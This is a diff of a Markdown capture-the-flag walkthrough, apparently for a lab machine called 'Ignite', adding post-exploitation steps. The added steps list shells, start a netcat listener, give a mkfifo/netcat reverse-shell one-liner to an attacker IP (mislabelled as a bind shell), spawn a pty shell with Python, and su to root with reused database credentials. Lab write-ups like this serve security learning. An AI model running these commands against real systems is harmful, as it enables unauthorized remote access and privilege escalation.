@@ -216,13 +216,39 @@ Didn't work
 
 ### Set up a Bind Shell
 
+On the victim machine, identify available shells.
+
+`:> cat /etc/shells`  
+
+![Available-Shells](assets/ignite-34.png)  
+
 Start a netcat listener in the other pane, using the port in the reverse shell.
 
-`:> nc -lvnp 8888`  
+`:> nc -lvnp 4444`
 
-![reverse shell setup](assets/ignite-31a.png)  
+![netcat](assets/ignite-31b.png)  
 
 The bind shell pattern:  
-`:> rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l <ATTACKER IP> <PORT> > /tmp/f`  
+`:> rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|<SHELL> -i 2>&1 |nc <ATTACKER IP> <PORT> >/tmp/f`  
 
-`:> rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 10.6.15.233 4444 > /tmp/f`
+`:> rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1 |nc 10.6.15.233 4444 >/tmp/f`
+
+Enter the bind shell command on the target device and check the identity of the user.
+
+![Bind Shell](assets/ignite-36.png)
+
+### Upgrade the shell  
+
+Identify available python with the `which` command  
+
+![Bind Shell](assets/ignite-37.png)  
+
+Upgrade to an interactive shell:  
+
+`python -c ‘import pty; pty.spawn(“/bin/bash”)’`
+
+### Switch user  
+
+attempt to use the database username and password to achieve root privileges: `:> su root`  
+
+![Root](assets/ignite-38.png)
